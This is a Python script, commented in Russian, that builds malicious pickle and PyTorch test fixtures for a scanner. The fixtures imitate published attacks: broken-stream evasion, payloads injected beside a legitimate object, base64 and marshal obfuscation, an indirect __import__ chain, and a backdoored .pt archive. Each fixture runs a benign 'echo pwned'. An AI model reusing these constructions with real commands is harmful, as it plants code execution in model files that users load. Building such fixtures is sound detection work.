#!/usr/bin/env python3
"""
Генерация malicious fixtures на основе реальных задокументированных техник.

Источники:
- real_01_broken_pickle:  nullifAI (ReversingLabs, Feb 2025) — broken pickle evasion
  https://thehackernews.com/2025/02/malicious-ml-models-found-on-hugging-face.html
- real_02_sleepy_inject:  Sleepy Pickle (Trail of Bits, Jun 2024) — payload injection
  https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/
- real_03_b64_exec:       Base64-encoded exec — стандартная техника обфускации
- real_04_marshal_rce:    Sticky Pickle (Trail of Bits, Jun 2024) — marshal+exec обфускация
- real_05_indirect_import: builtins.__import__+getattr chain — субклассовый обход
- real_06_torch_backdoor: JFrog/baller423 (Feb 2024) — __reduce__ в PyTorch .pt файле
  https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models/

ВАЖНО: все fixtures содержат реальные вредоносные opcodes, но payload — безопасный
('echo pwned' вместо reverse shell). Никогда не загружать через pickle.load()!
"""

from __future__ import annotations

import io
import pickle
import struct
import zipfile
from pathlib import Path

OUT = Path(__file__).parent


# ---------------------------------------------------------------------------
# Вспомогательные функции для ручной сборки pickle
# ---------------------------------------------------------------------------

def proto2() -> bytes:
    return b"\x80\x02"


def global_op(module: str, name: str) -> bytes:
    """Опкод GLOBAL — добавляет callable на стек."""
    return b"c" + f"{module}\n{name}\n".encode()


def short_str(s: str) -> bytes:
    """SHORT_BINUNICODE — строка до 255 символов."""
    enc = s.encode("utf-8")
    return b"\x8c" + bytes([len(enc)]) + enc


def short_bytes(b: bytes) -> bytes:
    """SHORT_BINBYTES — до 255 байт."""
    assert len(b) <= 255
    return b"C" + bytes([len(b)]) + b


def tuple1() -> bytes:
    return b"\x85"


def tuple2() -> bytes:
    return b"\x86"


def reduce() -> bytes:
    return b"R"


def pop() -> bytes:
    return b"0"  # POP — снимает верхушку стека (discards side-effect result)


def stop() -> bytes:
    return b"."


# ---------------------------------------------------------------------------
# Fixture 1: Broken pickle (nullifAI technique, Feb 2025)
# ---------------------------------------------------------------------------

def make_real_01_broken_pickle() -> bytes:
    """
    Broken pickle: payload выполняется ДО того, как парсер встречает
    невалидный opcode. Имитирует технику nullifAI (ReversingLabs, 2025).

    Старые сканеры показывали parsing error вместо "DANGEROUS" потому что
    сначала валидировали весь поток, потом сканировали. Наш сканер ловит частичные
    результаты даже при ошибке парсинга.
    """
    buf = bytearray()
    buf.extend(proto2())
    buf.extend(global_op("os", "system"))       # GLOBAL os system
    buf.extend(short_str("echo pwned"))          # args
    buf.extend(tuple1())                         # TUPLE1
    buf.extend(reduce())                         # REDUCE → os.system("echo pwned")
    buf.extend(b"\xff")                          # невалидный opcode — ломает поток
    # Намеренно нет STOP — поток обрывается на \xff
    return bytes(buf)


# ---------------------------------------------------------------------------
# Fixture 2: Sleepy Pickle injection (Trail of Bits, Jun 2024)
# ---------------------------------------------------------------------------

def make_real_02_sleepy_inject() -> bytes:
    """
    Sleepy Pickle: вредоносный REDUCE-вызов внедрён как side-effect перед
    основным (легитимным) pickle-объектом. os.system вызывается,
    результат отбрасывается через POP, и возвращается легитимный объект.

    Имитирует технику из Trail of Bits sleepy-pickle-public (Jun 2024).
    """
    # Легитимный объект — список чисел (упрощённая версия numpy array)
    legit = pickle.dumps([1.0, 2.0, 3.0], protocol=2)

    # Вредоносный side-effect: GLOBAL os system; "echo pwned"; TUPLE1; REDUCE; POP
    evil_side_effect = (
        global_op("os", "system")
        + short_str("echo pwned")
        + tuple1()
        + reduce()
        + pop()  # Отбрасываем return value os.system — стек не загрязняем
    )

    # Вставляем side-effect ПОСЛЕ PROTO opcode (первые 2 байта)
    proto_prefix = legit[:2]
    rest = legit[2:]
    return proto_prefix + evil_side_effect + rest


# ---------------------------------------------------------------------------
# Fixture 3: Base64-encoded exec (распространённая техника обфускации)
# ---------------------------------------------------------------------------

def make_real_03_b64_exec() -> bytes:
    """
    exec(base64.b64decode(b"...")) — обфускация команды через base64.
    Стандартная техника обхода простых grep/regex-based сканеров.

    Стек:
      GLOBAL builtins exec
      GLOBAL base64 b64decode
      SHORT_BINBYTES <base64-encoded payload>
      TUPLE1 → REDUCE  → bytes("import os; os.system('echo pwned')")
      TUPLE1 → REDUCE  → exec(decoded_bytes)  -- TypeError в runtime т.к. exec ожидает str
    Но нас интересует статический анализ: оба GLOBAL в потоке.
    """
    import base64
    encoded = base64.b64encode(b"import os; os.system('echo pwned')")

    buf = bytearray()
    buf.extend(proto2())
    buf.extend(global_op("builtins", "exec"))      # GLOBAL builtins exec
    buf.extend(global_op("base64", "b64decode"))   # GLOBAL base64 b64decode
    buf.extend(short_bytes(encoded))               # SHORT_BINBYTES <encoded>
    buf.extend(tuple1())
    buf.extend(reduce())                            # base64.b64decode(encoded) → bytes
    buf.extend(tuple1())
    buf.extend(reduce())                            # exec(bytes)
    buf.extend(stop())
    return bytes(buf)


# ---------------------------------------------------------------------------
# Fixture 4: Marshal + exec obfuscation (Sticky Pickle, Trail of Bits 2024)
# ---------------------------------------------------------------------------

def make_real_04_marshal_rce() -> bytes:
    """
    Sticky Pickle: marshal.loads(xor_bytes) + exec для запуска code object.
    Скрывает реальный payload за слоем marshal-сериализации + XOR.

    Стек:
      GLOBAL builtins exec
      GLOBAL marshal loads
      SHORT_BINBYTES <dummy_marshal_bytes>
      TUPLE1 → REDUCE  → marshal.loads(bytes) → code object
      TUPLE1 → REDUCE  → exec(code_object)
    """
    # В реальной атаке — это marshal-сериализованный code object с XOR-ключом.
    # Здесь используем dummy bytes, чтобы продемонстрировать структуру потока
    # без исполнения кода при тестировании.
    dummy_marshal = b"\xe3\x00\x00\x00\x00" + b"\x00" * 27  # marshal code object magic + pad

    buf = bytearray()
    buf.extend(proto2())
    buf.extend(global_op("builtins", "exec"))   # GLOBAL builtins exec
    buf.extend(global_op("marshal", "loads"))   # GLOBAL marshal loads
    buf.extend(short_bytes(dummy_marshal))      # SHORT_BINBYTES
    buf.extend(tuple1())
    buf.extend(reduce())                         # marshal.loads(dummy) → raises, но GLOBAL виден
    buf.extend(tuple1())
    buf.extend(reduce())                         # exec(...)
    buf.extend(stop())
    return bytes(buf)


# ---------------------------------------------------------------------------
# Fixture 5: Indirect __import__ + getattr chain
# ---------------------------------------------------------------------------

def make_real_05_indirect_import() -> bytes:
    """
    Косвенный вызов через builtins.__import__ + builtins.getattr:
        getattr(__import__('os'), 'system')('echo pwned')

    Попытка обойти сканеры, которые blocklist-ят 'os' модуль напрямую.
    Использует только builtins.* функции, которые выглядят «системными».

    Стек:
      GLOBAL builtins getattr
      GLOBAL builtins __import__
      'os'
      TUPLE1 → REDUCE  → os module
      'system'
      TUPLE2 → REDUCE  → getattr(os, 'system') = os.system
      'echo pwned'
      TUPLE1 → REDUCE  → os.system('echo pwned')
    """
    buf = bytearray()
    buf.extend(proto2())
    buf.extend(global_op("builtins", "getattr"))    # GLOBAL builtins getattr
    buf.extend(global_op("builtins", "__import__")) # GLOBAL builtins __import__
    buf.extend(short_str("os"))                     # 'os'
    buf.extend(tuple1())
    buf.extend(reduce())                             # __import__('os') = os module
    buf.extend(short_str("system"))                 # 'system'
    buf.extend(tuple2())
    buf.extend(reduce())                             # getattr(os, 'system') = os.system
    buf.extend(short_str("echo pwned"))
    buf.extend(tuple1())
    buf.extend(reduce())                             # os.system('echo pwned')
    buf.extend(stop())
    return bytes(buf)


# ---------------------------------------------------------------------------
# Fixture 6: PyTorch .pt backdoor (baller423/goober2 style, JFrog Feb 2024)
# ---------------------------------------------------------------------------

def make_real_06_torch_backdoor() -> bytes:
    """
    Имитирует технику baller423/goober2 (JFrog, Feb 2024):
    PyTorch-совместимый .pt файл (ZIP-формат) с malicious __reduce__ payload
    в archive/data.pkl.

    В оригинальной атаке payload устанавливал обратное соединение (reverse shell)
    через os.system(). Здесь используем безопасный 'echo pwned'.

    Структура ZIP:
      archive/data.pkl    — pickle с вредоносным REDUCE
      archive/record.pkl  — минимальный pickle для совместимости с torch.load()
    """
    # Pickle payload — вредоносный __reduce__ эквивалент
    evil_pkl = (
        proto2()
        + global_op("os", "system")
        + short_str("echo pwned")
        + tuple1()
        + reduce()
        + stop()
    )

    # Минимальный record.pkl для torch.load() compatibility
    record_pkl = proto2() + b"}" + stop()  # PROTO 2; EMPTY_DICT; STOP

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zf:
        zf.writestr("archive/data.pkl", evil_pkl)
        zf.writestr("archive/record.pkl", record_pkl)
    return buf.getvalue()


# ---------------------------------------------------------------------------
# Запись всех fixtures
# ---------------------------------------------------------------------------

FIXTURES: list[tuple[str, bytes]] = [
    ("real_01_broken_pickle.pkl", make_real_01_broken_pickle()),
    ("real_02_sleepy_inject.pkl", make_real_02_sleepy_inject()),
    ("real_03_b64_exec.pkl", make_real_03_b64_exec()),
    ("real_04_marshal_rce.pkl", make_real_04_marshal_rce()),
    ("real_05_indirect_import.pkl", make_real_05_indirect_import()),
    ("real_06_torch_backdoor.pt", make_real_06_torch_backdoor()),
]


def main() -> None:
    for filename, data in FIXTURES:
        path = OUT / filename
        path.write_bytes(data)
        print(f"  написан {filename} ({len(data)} байт)")

    print(f"\nВсего: {len(FIXTURES)} fixtures в {OUT}")


if __name__ == "__main__":
    main()
